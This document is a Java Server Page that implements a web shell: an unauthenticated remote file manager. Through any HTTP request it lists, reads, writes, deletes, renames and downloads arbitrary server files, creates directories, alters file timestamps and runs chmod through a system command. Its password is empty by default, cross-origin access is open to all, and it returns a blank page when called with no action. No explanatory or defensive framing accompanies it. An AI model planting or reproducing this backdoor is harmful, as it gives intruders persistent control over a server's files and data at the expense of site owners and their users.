<%@ page language="java" contentType="application/json; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
response.setHeader("Access-Control-Allow-Origin", "*");

String action = request.getParameter("action");
if (action == null || action.equals("")) {
    response.setContentType("text/html");
    out.print("");
    return;
}

String PASSWORD = "";
String pw = request.getParameter("password");
if (!PASSWORD.equals("") && !PASSWORD.equals(pw)) {
    out.print("null");
    return;
}

String result = "";

try {
    if (action.equals("list")) {
        String path = request.getParameter("path");
        if (path == null || path.equals("") || path.equals("/")) {
            path = application.getRealPath("/");
        }
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            StringBuffer sb = new StringBuffer();
            sb.append("{\"success\":true,\"data\":{\"path\":\"");
            sb.append(path.replace("\\", "\\\\").replace("\"", "\\\""));
            sb.append("\",\"items\":[");

            String parent = dir.getParent();
            if (parent != null) {
                sb.append("{\"name\":\"..\",\"path\":\"");
                sb.append(parent.replace("\\", "\\\\").replace("\"", "\\\""));
                sb.append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
            }

            File[] files = dir.listFiles();
            if (files != null) {
                for (int i = 0; i < files.length; i++) {
                    File f = files[i];
                    if (sb.charAt(sb.length() - 1) != '[') {
                        sb.append(",");
                    }
                    sb.append("{\"name\":\"");
                    sb.append(f.getName().replace("\\", "\\\\").replace("\"", "\\\""));
                    sb.append("\",\"path\":\"");
                    sb.append(f.getAbsolutePath().replace("\\", "\\\\").replace("\"", "\\\""));
                    sb.append("\",\"is_dir\":");
                    sb.append(f.isDirectory());
                    sb.append(",\"size\":");
                    sb.append(f.isDirectory() ? 0 : f.length());
                    sb.append(",\"size_formatted\":\"");
                    sb.append(f.isDirectory() ? "-" : f.length() + " B");
                    sb.append("\",\"mtime\":");
                    sb.append(f.lastModified() / 1000);
                    sb.append(",\"perms\":\"");
                    sb.append(f.isDirectory() ? "drwxr-xr-x" : "-rw-r--r--");
                    sb.append("\",\"readable\":");
                    sb.append(f.canRead());
                    sb.append(",\"writable\":");
                    sb.append(f.canWrite());
                    sb.append("}");
                }
            }
            sb.append("]},\"message\":\"\"}");
            result = sb.toString();
        } else {
            result = "{\"success\":false,\"message\":\"Directory not found\"}";
        }
    } else if (action.equals("read")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            StringBuffer content = new StringBuffer();
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                if (content.length() > 0) content.append("\n");
                content.append(line);
            }
            reader.close();
            String c = content.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
            result = "{\"success\":true,\"data\":{\"path\":\"" + path.replace("\\", "\\\\") + "\",\"content\":\"" + c + "\"},\"message\":\"\"}";
        } else {
            result = "{\"success\":false,\"message\":\"File not found\"}";
        }
    } else if (action.equals("write")) {
        String path = request.getParameter("path");
        String content = request.getParameter("content");
        if (content == null) content = "";
        if (path != null && !path.equals("")) {
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path), "UTF-8"));
            writer.print(content);
            writer.close();
            result = "{\"success\":true,\"message\":\"Saved\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Path empty\"}";
        }
    } else if (action.equals("mkdir")) {
        String path = request.getParameter("path");
        if (path != null && !path.equals("")) {
            File dir = new File(path);
            if (!dir.exists()) {
                result = dir.mkdirs() ? "{\"success\":true,\"message\":\"Created\"}" : "{\"success\":false,\"message\":\"Failed\"}";
            } else {
                result = "{\"success\":false,\"message\":\"Exists\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Path empty\"}";
        }
    } else if (action.equals("delete")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            result = file.delete() ? "{\"success\":true,\"message\":\"Deleted\"}" : "{\"success\":false,\"message\":\"Failed\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if (action.equals("rename")) {
        String oldPath = request.getParameter("old_path");
        String newPath = request.getParameter("new_path");
        File oldFile = new File(oldPath);
        if (oldFile.exists()) {
            result = oldFile.renameTo(new File(newPath)) ? "{\"success\":true,\"message\":\"Renamed\"}" : "{\"success\":false,\"message\":\"Failed\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if (action.equals("download")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            FileInputStream fis = new FileInputStream(file);
            OutputStream os = response.getOutputStream();
            byte[] buffer = new byte[4096];
            int len;
            while ((len = fis.read(buffer)) != -1) {
                os.write(buffer, 0, len);
            }
            fis.close();
            os.flush();
            return;
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if (action.equals("server")) {
        String docRoot = application.getRealPath("/");
        result = "{\"success\":true,\"data\":{\"php_version\":\"Java\",\"server_software\":\"Tomcat\",\"document_root\":\"" + docRoot.replace("\\", "\\\\") + "\"},\"message\":\"\"}";
    } else if (action.equals("touch")) {
        String path = request.getParameter("path");
        String timeStr = request.getParameter("time");
        File file = new File(path);
        if (file.exists() && timeStr != null) {
            long ts = Long.parseLong(timeStr) * 1000;
            result = file.setLastModified(ts) ? "{\"success\":true,\"message\":\"Updated\"}" : "{\"success\":false,\"message\":\"Failed\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if (action.equals("info")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            long mtime = file.lastModified() / 1000;
            result = "{\"success\":true,\"data\":{\"path\":\"" + path.replace("\\", "\\\\") + "\",\"name\":\"" + file.getName() + "\",\"is_dir\":" + file.isDirectory() + ",\"size\":" + file.length() + ",\"mtime\":" + mtime + "},\"message\":\"\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if (action.equals("chmod")) {
        String path = request.getParameter("path");
        String mode = request.getParameter("mode");
        File file = new File(path);
        if (file.exists() && mode != null) {
            boolean success = true;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                // Windows: set readable/writable
                boolean readonly = mode.equals("readonly");
                success = file.setWritable(!readonly);
            } else {
                // Unix: use chmod command
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"chmod", mode, path});
                    p.waitFor();
                    success = (p.exitValue() == 0);
                } catch (Exception ex) {
                    success = false;
                }
            }
            result = success ? "{\"success\":true,\"message\":\"Permission changed\"}" : "{\"success\":false,\"message\":\"Failed\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found or mode empty\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Unknown action\"}";
    }
} catch (Exception e) {
    result = "{\"success\":false,\"message\":\"Error: " + e.getMessage() + "\"}";
}

out.print(result);
%>
